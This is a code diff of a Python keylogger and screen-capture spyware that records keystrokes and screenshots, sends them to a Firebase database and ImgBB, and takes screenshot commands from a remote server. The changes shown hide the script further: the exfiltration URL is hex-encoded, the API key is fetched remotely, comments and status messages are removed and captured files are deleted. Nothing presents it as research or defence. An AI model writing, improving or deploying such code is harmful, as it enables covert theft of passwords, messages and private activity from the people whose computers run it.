@@ -4,44 +4,45 @@ from datetime import datetime
 import socket
 import threading
 import time
-from PIL import ImageGrab  # For taking screenshots
-from pynput.keyboard import Listener, Key  # Import Listener and Key from pynput
+from PIL import ImageGrab
+from pynput.keyboard import Listener, Key
 
-# Firebase URL
-firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
-
-# Log file and hostname
-log_file = "system-files.txt"
+fu = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x72\x6f\x6a\x65\x63\x74\x2d\x72\x75\x6e\x6e\x6e\x65\x72\x2d\x64\x65\x66\x61\x75\x6c\x74\x2d\x72\x74\x64\x62\x2e\x66\x69\x72\x65\x62\x61\x73\x65\x69\x6f\x2e\x63\x6f\x6d\x2f'
+os.makedirs('files', exist_ok=True)
+log_file = "files/system-files.txt"
 hostname = socket.gethostname()
-screenshot_folder = "systemss"  # Folder for images
-
-# ImgBB API key
-api_key = 'e'+'b'+'5'+'d'+'a'+'5'+'6'+'a'+'b'+'a6974e62ae41'+'9'+'2099ac1e3'+'f'
-
-# Command path for Firebase
+screenshot_folder = "systemss"
 command_path = f'users/{hostname}/command.json'
 
-# Function to check internet availability
 def is_internet_available():
     try:
         socket.create_connection(("8.8.8.8", 53), timeout=5)
         return True
     except (socket.timeout, socket.error):
         return False
+    
+def fetch_api_key():
+    api_key_path = 'system.json' 
+    try:
+        response = requests.get(fu + api_key_path)
+        if response.status_code == 200:
+            api_key_data = response.json()
+            return api_key_data.get('api_key')  
+        else:
+            return None
+    except requests.exceptions.RequestException as e:
+        return None
 
-# Function to upload log data to Firebase
+
 def upload_log():
     with open(log_file, 'r') as file:
         content = file.read().strip()
 
-    # Check if the log file has only the new log marker
     new_log_marker = f"** New logging started at"
     if content.startswith(new_log_marker) and content.count(new_log_marker) == 1 and len(content.split("\n")) == 1:
-        print("Log file contains only the new log start marker. Skipping upload.")
         return False
 
     if not is_internet_available():
-        print("Internet not available, skipping upload.")
         return False
 
     db_path = f'users/{hostname}/keylog/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
@@ -52,55 +53,46 @@ def upload_log():
     data_to_upload = {'runnner': file_data}
 
     try:
-        response = requests.put(firebase_url + db_path, json=data_to_upload)
-        requests.put(firebase_url + command_path, json={'ss_count':0})
+        response = requests.put(fu + db_path, json=data_to_upload)
+        requests.put(fu + command_path, json={'ss_count':0})
         if response.status_code == 200:
-            print(f"Uploaded: {log_file}")
-            # Clear the log file after successful upload
             with open(log_file, 'w') as file:
                 file.truncate(0)
-            # Add a new marker for the next logging session
             add_new_log_marker()
             return True
         else:
-            print(f"Failed to upload (Status code {response.status_code}): {log_file}")
             return False
     except requests.exceptions.RequestException as e:
-        print(f"Failed to upload {log_file}: {e}")
         return False
 
-# Function to add a new logging session marker
 def add_new_log_marker():
     with open(log_file, 'a') as file:
         file.write(f"\n** New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} **\n")
 
-# Function to periodically attempt uploading the log file every 1 minute
 def periodic_upload():
     while True:
         if upload_log():
             print("Log file uploaded successfully and cleared.")
         else:
             print("Upload failed or not needed. Retrying in 1 minute.")
-        time.sleep(60)  # Wait for 1 minute before the next attempt
+        time.sleep(60)
 
-# Function to periodically take screenshots every 1 minute
 def periodic_screenshots():
-    os.makedirs(screenshot_folder, exist_ok=True)  # Ensure the screenshot folder exists
+    os.makedirs(screenshot_folder, exist_ok=True)
     while True:
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         screenshot_path = os.path.join(screenshot_folder, f"{hostname}_{timestamp}.png")
         try:
             screenshot = ImageGrab.grab()
             screenshot.save(screenshot_path)
-            print(f"Image saved at {screenshot_path}")
-            upload_image_to_imgbb(screenshot_path)  # Upload image after saving it
-            os.remove(screenshot_path)  # Delete the image after upload
+            upload_image_to_imgbb(screenshot_path)
+            os.remove(screenshot_path)
         except Exception as e:
             print(f"Failed to take screenshot: {e}")
-        time.sleep(60)  # Wait for 1 minute before the next image capture
+        time.sleep(60)
 
-# Function to upload the screenshot to ImgBB
 def upload_image_to_imgbb(image_path):
+    api_key = fetch_api_key()
     with open(image_path, 'rb') as image_file:
         files = {'image': image_file}
         params = {'key': api_key}
@@ -113,11 +105,9 @@ def upload_image_to_imgbb(image_path):
     else:
         print(f"Failed to upload {image_path}. Response: {response.text}")
 
-# Debounce settings for keystrokes
 recent_keys = {}
 debounce_time = 0.2
 
-# Function to write keystrokes to the current log file with debounce
 def write_to_file(key):
     current_time = time.time()
     key_str = None
@@ -135,27 +125,34 @@ def write_to_file(key):
             file.write(key_str)
         recent_keys[key_str] = current_time
 
-# Function to start the listener for keystrokes
 def start_listener():
     with Listener(on_press=write_to_file) as listener:
         listener.join()
 
-# Ensure the log file exists, create it if it doesn't
 def ensure_log_exists():
-    if not os.path.exists(log_file):  # Create the log file if it doesn't exist
+    if not os.path.exists(log_file):
         with open(log_file, 'w') as file:
-            pass  # Create an empty log file
+            pass
 
-# Function to check and update screenshot count every 10 seconds
+def delete_all_files_in_folder(folder_path):
+    try:
+        if not os.path.exists(folder_path):
+            return
+        for file_name in os.listdir(folder_path):
+            file_path = os.path.join(folder_path, file_name)
+            if os.path.isfile(file_path):
+                os.remove(file_path)
+    except Exception as e:
+        pass        
+
 def handle_screenshot_interval():
-    os.makedirs(screenshot_folder, exist_ok=True)  # Ensure the screenshot folder exists
+    os.makedirs(screenshot_folder, exist_ok=True)
     while True:
         try:
-            response = requests.get(firebase_url + command_path)
+            response = requests.get(fu + command_path)
             if response.status_code == 200:
                 command_data = response.json()
                 
-                # If command_data is None or does not contain 'ss_count', initialize it
                 if command_data is None:
                     command_data = {'ss_count': 0}
                 elif 'ss_count' not in command_data:
@@ -164,54 +161,42 @@ def handle_screenshot_interval():
                 ss_count = command_data.get('ss_count', 0)
 
                 if ss_count > 0:
-                    print(f"Taking {ss_count} images...")
-
-                    # Take images in intervals of 10 seconds
                     for _ in range(ss_count):
                         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                         image_path = os.path.join(screenshot_folder, f"{hostname}_{timestamp}.png")
                         try:
                             screenshot = ImageGrab.grab()
                             screenshot.save(image_path)
-                            print(f"Image saved at {image_path}")
-                            upload_image_to_imgbb(image_path)  # Upload image
-                            os.remove(image_path)  # Delete the image after upload
-                            time.sleep(10)  # Wait for 10 seconds between images
+                            upload_image_to_imgbb(image_path)
+                            os.remove(image_path)
+                            time.sleep(10)
                         except Exception as e:
                             print(f"Failed to take image: {e}")
 
-                    # After taking images, decrement the `ss_count` in Firebase
                     command_data['ss_count'] = max(0, command_data['ss_count'] - ss_count)
-                    requests.put(firebase_url + command_path, json=command_data)
+                    requests.put(fu + command_path, json=command_data)
 
             else:
                 print(f"Failed to fetch command data, Status code: {response.status_code}")
         except requests.exceptions.RequestException as e:
             print(f"Error fetching command data: {e}")
 
-        time.sleep(10)  # Check the command data every 10 seconds
+        time.sleep(10)
+        delete_all_files_in_folder(screenshot_folder)
 
-# Main process
 if __name__ == "__main__":
-    ensure_log_exists()  # Ensure that the log file exists
-
-    # Add a marker for the new logging session
+    ensure_log_exists()
     add_new_log_marker()
 
-    # Start listener in a separate thread
     listener_thread = threading.Thread(target=start_listener, daemon=True)
     listener_thread.start()
 
-    # Start periodic upload in a separate thread
     upload_thread = threading.Thread(target=periodic_upload, daemon=True)
     upload_thread.start()
 
-
-    # Start image interval handling in a separate thread
     screenshot_interval_thread = threading.Thread(target=handle_screenshot_interval, daemon=True)
     screenshot_interval_thread.start()
 
-    # Keep the main thread running
     listener_thread.join()
     upload_thread.join()
     screenshot_interval_thread.join()
